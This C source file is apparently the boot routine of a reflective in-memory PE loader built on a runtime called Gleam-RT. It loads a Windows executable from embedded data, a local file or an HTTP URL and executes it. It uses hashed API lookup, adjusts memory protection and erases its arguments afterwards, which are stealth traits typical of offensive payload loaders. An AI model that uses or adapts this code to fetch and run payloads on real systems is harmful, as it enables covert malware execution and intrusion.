#include "c_types.h"
#include "windows_t.h"
#include "rel_addr.h"
#include "lib_memory.h"
#include "errno.h"
#include "runtime.h"
#include "pe_loader.h"
#include "epilogue.h"
#include "boot.h"

static errno loadOption(Runtime_Opts* options);
static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config);
static void* loadImage(Runtime_M* runtime, byte* config, uint32 size);
static errno eraseArguments(Runtime_M* runtime);

static void* loadImageFromEmbed(Runtime_M* runtime, byte* config);
static void* loadImageFromFile(Runtime_M* runtime, byte* config);
static void* loadImageFromHTTP(Runtime_M* runtime, byte* config);

PELoader_M* Boot()
{
    // initialize Gleam-RT for PE Loader
    Runtime_Opts options = {
        .BootInstAddress     = GetFuncAddr(&Boot),
        .NotEraseInstruction = false,
        .NotAdjustProtect    = false,
        .TrackCurrentThread  = false,
    };
    errno elo = loadOption(&options);
    if (elo != NO_ERROR)
    {
        SetLastErrno(elo);
        return NULL;
    }
    Runtime_M* runtime = InitRuntime(&options);
    if (runtime == NULL)
    {
        return NULL;
    }

    // load config and initialize PE Loader
    PELoader_Cfg config = {
        .FindAPI = runtime->HashAPI.FindAPI,

        .Image        = NULL,
        .CommandLineA = NULL,
        .CommandLineW = NULL,
        .WaitMain     = false,
        .StdInput     = NULL,
        .StdOutput    = NULL,
        .StdError     = NULL,

        .NotEraseInstruction = options.NotEraseInstruction,
        .NotAdjustProtect    = options.NotAdjustProtect,
    };
    PELoader_M* loader = NULL;
    errno err = NO_ERROR;
    for (;;)
    {
        err = loadConfig(runtime, &config);
        if (err != NO_ERROR)
        {
            break;
        }
        loader = InitPELoader(runtime, &config);
        if (loader == NULL)
        {
            err = GetLastErrno();
            break;
        }
        runtime->Memory.Free(config.Image);
        err = eraseArguments(runtime);
        if (err != NO_ERROR)
        {
            break;
        }
        break;
    }
    if (err != NO_ERROR || loader == NULL)
    {
        runtime->Core.Exit();
        SetLastErrno(err);
        return NULL;
    }

    // execute PE image
    errno ele = loader->Execute();
    if (ele != NO_ERROR && err == NO_ERROR)
    {
        err = ele;
    }
    if (!config.WaitMain)
    {
        SetLastErrno(err);
        return loader;
    }
    // destroy pe loader and exit runtime
    errno eld = loader->Destroy();
    if (eld != NO_ERROR && err == NO_ERROR)
    {
        err = eld;
    }
    errno ere = runtime->Core.Exit();
    if (ere != NO_ERROR && err == NO_ERROR)
    {
        err = ere;
    }
    SetLastErrno(err);
    return loader;
}

__declspec(noinline)
static errno loadOption(Runtime_Opts* options)
{
    uintptr stub = (uintptr)(GetFuncAddr(&Argument_Stub));
    stub -= OPTION_STUB_SIZE;
    // check runtime option stub is valid
    if (*(byte*)stub != OPTION_STUB_MAGIC)
    {
        return ERR_INVALID_OPTION_STUB;
    }
    // load runtime options from stub
    options->NotEraseInstruction = *(bool*)(stub+OPT_OFFSET_NOT_ERASE_INSTRUCTION);
    options->NotAdjustProtect    = *(bool*)(stub+OPT_OFFSET_NOT_ADJUST_PROTECT);
    options->TrackCurrentThread  = *(bool*)(stub+OPT_OFFSET_NOT_TRACK_CURRENT_THREAD);
    return NO_ERROR;
}

__declspec(noinline)
static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
{
    uint32 size;
    // load PE Image, it cannot be empty
    if (!runtime->Argument.GetPointer(ARG_IDX_PE_IMAGE, &config->Image, &size))
    {
        return ERR_NOT_FOUND_PE_IMAGE;
    }
    if (size == 0)
    {
        return ERR_EMPTY_PE_IMAGE_DATA;
    }
    void* image = loadImage(runtime, config->Image, size);
    if (image == NULL)
    {
        return GetLastErrno();
    }
    config->Image = image;
    // load command line ANSI, it can be empty
    if (!runtime->Argument.GetPointer(ARG_IDX_CMDLINE_A, &config->CommandLineA, &size))
    {
        return ERR_NOT_FOUND_CMDLINE_A;
    }
    if (size > 4096)
    {
        return ERR_COMMAND_LINE_TOO_LONG;
    }
    // load command line Unicode, it can be empty
    if (!runtime->Argument.GetPointer(ARG_IDX_CMDLINE_W, &config->CommandLineW, &size))
    {
        return ERR_NOT_FOUND_CMDLINE_W;
    }
    if (size > 4096)
    {
        return ERR_COMMAND_LINE_TOO_LONG;
    }
    // load wait main, it must be true of false
    if (!runtime->Argument.GetValue(ARG_IDX_WAIT_MAIN, &config->WaitMain, &size))
    {
        return ERR_NOT_FOUND_WAIT_MAIN;
    }
    if (size != sizeof(bool))
    {
        return ERR_INVALID_WAIT_MAIN;
    }
    // load STD_INPUT_HANDLE, it can be zero
    if (!runtime->Argument.GetValue(ARG_IDX_STD_INPUT, &config->StdInput, &size))
    {
        return ERR_NOT_FOUND_STD_INPUT;
    }
    if (size != sizeof(HANDLE))
    {
        return ERR_INVALID_STD_INPUT;
    }
    // load STD_OUTPUT_HANDLE, it can be zero
    if (!runtime->Argument.GetValue(ARG_IDX_STD_OUTPUT, &config->StdOutput, &size))
    {
        return ERR_NOT_FOUND_STD_OUTPUT;
    }
    if (size != sizeof(HANDLE))
    {
        return ERR_INVALID_STD_OUTPUT;
    }
    // load STD_ERROR_HANDLE, it can be zero
    if (!runtime->Argument.GetValue(ARG_IDX_STD_ERROR, &config->StdError, &size))
    {
        return ERR_NOT_FOUND_STD_ERROR;
    }
    if (size != sizeof(HANDLE))
    {
        return ERR_INVALID_STD_ERROR;
    }
    return NO_ERROR;
}

static void* loadImage(Runtime_M* runtime, byte* config, uint32 size)
{
    if (size < 4)
    {
        SetLastErrno(ERR_INVALID_IMAGE_CONFIG);
        return NULL;
    }
    byte mode = *config;
    config++;
    switch (mode)
    {
    case MODE_EMBED_IMAGE:
        return loadImageFromEmbed(runtime, config);
    case MODE_LOCAL_FILE:
        return loadImageFromFile(runtime, config);
    case MODE_HTTP_SERVER:
        return loadImageFromHTTP(runtime, config);
    default:
        SetLastErrno(ERR_INVALID_LOAD_MODE);
        return NULL;
    }
}

static void* loadImageFromEmbed(Runtime_M* runtime, byte* config)
{
    byte mode = *config;
    config++;
    switch (mode)
    {
    case EMBED_DISABLE_COMPRESS:
        uint32 size = *(uint32*)config;
        void* buf = runtime->Memory.Alloc(size);
        mem_copy(buf, config + 4, size);
        return buf;
    case EMBED_ENABLE_COMPRESS:
        // TODO
        // runtime->Compressor.Decompress();
        return config;
    default:
        SetLastErrno(ERR_INVALID_EMBED_CONFIG);
        return NULL;
    }
}

static void* loadImageFromFile(Runtime_M* runtime, byte* config)
{
    byte* buf  = NULL;
    uint  size = 0;
    errno errno = runtime->WinFile.ReadFileW((LPWSTR)config, &buf, &size);
    if (errno != NO_ERROR)
    {
        SetLastErrno(errno);
        return NULL;
    }
    if (size < 64)
    {
        SetLastErrno(ERR_INVALID_PE_IMAGE);
        return NULL;
    }
    return buf;
}

static void* loadImageFromHTTP(Runtime_M* runtime, byte* config)
{
    HTTP_Resp resp;
    mem_init(&resp, sizeof(resp));
    errno errno = runtime->WinHTTP.Get((UTF16)config, NULL, &resp);
    if (errno != NO_ERROR)
    {
        SetLastErrno(errno);
        return NULL;
    }
    if (resp.Body.Size < 64)
    {
        SetLastErrno(ERR_INVALID_PE_IMAGE);
        return NULL;
    }
    runtime->WinHTTP.Free();
    return resp.Body.Buf;
}

static errno eraseArguments(Runtime_M* runtime)
{
    uint32 idx[] = 
    {
        ARG_IDX_PE_IMAGE,
        ARG_IDX_WAIT_MAIN,
        ARG_IDX_STD_INPUT,
        ARG_IDX_STD_OUTPUT,
        ARG_IDX_STD_ERROR,
    };
    bool success = true;
    for (int i = 0; i < arrlen(idx); i++)
    {
        if (!runtime->Argument.Erase(idx[i]))
        {
            success = false;   
        }
    }
    if (success)
    {
        return NO_ERROR;
    }
    return ERR_ERASE_ARGUMENTS;
}
